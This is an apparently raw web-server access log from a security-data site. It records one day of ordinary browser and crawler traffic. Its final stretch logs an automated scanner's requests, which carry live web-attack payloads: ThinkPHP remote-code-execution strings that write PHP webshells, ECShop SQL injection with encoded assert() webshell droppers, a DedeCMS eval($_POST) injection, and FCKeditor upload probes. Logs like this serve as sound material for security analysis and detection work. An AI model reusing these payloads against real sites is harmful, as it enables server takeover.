157.55.39.172 - - [31/Oct/2019:02:30:50 -0700] "GET /self.logs/access.log.2018-01-23.gz HTTP/1.1" 200 31795 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [31/Oct/2019:08:26:24 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
86.82.209.27 - - [31/Oct/2019:08:37:02 -0700] "GET / HTTP/1.1" 200 12620 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
86.82.209.27 - - [31/Oct/2019:08:37:02 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
86.82.209.27 - - [31/Oct/2019:08:37:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
86.82.209.27 - - [31/Oct/2019:08:37:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
86.82.209.27 - - [31/Oct/2019:08:37:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36" 
23.253.92.35 - - [31/Oct/2019:08:51:34 -0700] "GET /robots.txt HTTP/1.1" 301 439 "-" "Tornado-Async-Client" 
23.253.92.35 - - [31/Oct/2019:08:51:35 -0700] "GET /robots.txt HTTP/1.1" 304 128 "-" "Tornado-Async-Client" 
23.253.92.35 - - [31/Oct/2019:08:51:35 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 481 "-" "Tornado-Async-Client" 
74.119.146.35 - - [31/Oct/2019:08:53:10 -0700] "GET / HTTP/1.1" 200 12620 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
154.213.160.252 - - [31/Oct/2019:08:53:57 -0700] "GET /index.php HTTP/1.1" 404 294 "http://www.secrepo.com/index.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
17.58.97.112 - - [31/Oct/2019:09:05:29 -0700] "GET /self.logs HTTP/1.1" 301 439 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.97.112 - - [31/Oct/2019:09:05:30 -0700] "GET /self.logs/ HTTP/1.1" 200 18975 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
195.173.82.250 - - [31/Oct/2019:09:08:03 -0700] "GET / HTTP/1.1" 200 12620 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
195.173.82.250 - - [31/Oct/2019:09:08:03 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
195.173.82.250 - - [31/Oct/2019:09:08:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
195.173.82.250 - - [31/Oct/2019:09:08:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
195.173.82.250 - - [31/Oct/2019:09:08:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
46.119.114.102 - - [31/Oct/2019:09:09:14 -0700] "GET / HTTP/1.1" 200 47148 "https://shkolnikam.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.119.114.102 - - [31/Oct/2019:09:09:14 -0700] "GET / HTTP/1.1" 200 47148 "https://www.dominicacitizenship.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)" 
46.119.114.102 - - [31/Oct/2019:09:09:15 -0700] "GET / HTTP/1.1" 200 47148 "https://shkolnikam.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.119.114.102 - - [31/Oct/2019:09:09:15 -0700] "GET / HTTP/1.1" 200 47148 "https://www.dominicacitizenship.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)" 
46.119.114.102 - - [31/Oct/2019:09:09:15 -0700] "GET / HTTP/1.1" 200 47148 "https://shkolnikam.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.119.114.102 - - [31/Oct/2019:09:09:15 -0700] "GET / HTTP/1.1" 200 47148 "https://www.dominicacitizenship.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Creative)" 
155.69.179.63 - - [31/Oct/2019:09:14:27 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 76230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
123.125.71.39 - - [31/Oct/2019:09:35:47 -0700] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.45 - - [31/Oct/2019:09:35:48 -0700] "GET / HTTP/1.1" 200 12582 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
111.206.198.108 - - [31/Oct/2019:09:35:50 -0700] "GET /css/style.css HTTP/1.1" 404 250 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)" 
113.171.224.176 - - [31/Oct/2019:09:35:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
130.70.15.5 - - [31/Oct/2019:09:41:53 -0700] "GET / HTTP/1.1" 200 12619 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
130.70.15.5 - - [31/Oct/2019:09:41:53 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
130.70.15.5 - - [31/Oct/2019:09:41:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
130.70.15.5 - - [31/Oct/2019:09:41:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
130.70.15.5 - - [31/Oct/2019:09:41:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
66.249.64.143 - - [31/Oct/2019:09:46:52 -0700] "GET / HTTP/1.1" 200 12619 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.139 - - [31/Oct/2019:09:46:59 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
213.144.118.99 - - [31/Oct/2019:09:48:04 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420883 "-" "Wget/1.20.3 (linux-gnu)" 
74.119.146.35 - - [31/Oct/2019:09:52:50 -0700] "GET / HTTP/1.1" 200 12619 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
185.40.73.134 - - [31/Oct/2019:09:54:09 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420883 "-" "Wget/1.20.3 (linux-gnu)" 
178.137.85.37 - - [31/Oct/2019:09:54:37 -0700] "GET / HTTP/1.1" 200 47148 "https://ukrtvory.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; TheFreeDictionary.com; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)" 
178.137.85.37 - - [31/Oct/2019:09:54:37 -0700] "GET / HTTP/1.1" 200 47148 "https://ukrtvory.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; TheFreeDictionary.com; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)" 
178.137.85.37 - - [31/Oct/2019:09:54:38 -0700] "GET / HTTP/1.1" 200 47148 "https://ukrtvory.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; TheFreeDictionary.com; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)" 
185.40.73.134 - - [31/Oct/2019:09:55:36 -0700] "GET /maccdc2012/ HTTP/1.1" 200 784 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
213.144.115.26 - - [31/Oct/2019:09:55:36 -0700] "GET /favicon.ico HTTP/1.1" 200 302 "http://www.secrepo.com/maccdc2012/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
213.144.118.99 - - [31/Oct/2019:09:55:46 -0700] "GET / HTTP/1.1" 200 12619 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
185.40.73.134 - - [31/Oct/2019:09:55:46 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
185.40.73.134 - - [31/Oct/2019:09:55:52 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1630 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
213.144.118.99 - - [31/Oct/2019:09:56:06 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36" 
220.181.51.115 - - [31/Oct/2019:10:08:58 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
220.181.51.113 - - [31/Oct/2019:10:08:58 -0700] "GET /robots.txt HTTP/1.1" 200 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:12:21 -0700] "GET /self.logs/ HTTP/1.1" 200 19053 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:12:21 -0700] "GET /favicon.ico HTTP/1.1" 200 279 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:12:27 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17573 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:15:59 -0700] "GET / HTTP/1.1" 200 12620 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:16:00 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:16:00 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:16:00 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
184.71.254.98 - - [31/Oct/2019:10:16:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
66.249.88.109 - - [31/Oct/2019:10:25:30 -0700] "GET / HTTP/1.1" 200 12620 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.88.111 - - [31/Oct/2019:10:25:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 691 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 578 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 301 560 "http://secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "GET /plus/moon.php HTTP/1.1" 301 500 "http://secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /plus/90sec.php HTTP/1.1" 301 502 "http://secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 301 580 "http://secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:19 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 301 544 "http://secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 301 716 "http://secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 301 556 "http://secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 301 536 "http://secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "POST /fdgq.php HTTP/1.1" 301 490 "http://secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=czpuc.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 301 774 "http://secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=czpuc.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "POST /czpuc.php HTTP/1.1" 301 492 "http://secrepo.com/czpuc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:20 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:21 -0700] "POST /ysyqq.php HTTP/1.1" 301 492 "http://secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:21 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=aevml.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ HTTP/1.1" 301 918 "http://secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=aevml.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
178.156.202.83 - - [31/Oct/2019:10:26:21 -0700] "POST /aevml.php HTTP/1.1" 301 492 "http://secrepo.com/aevml.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
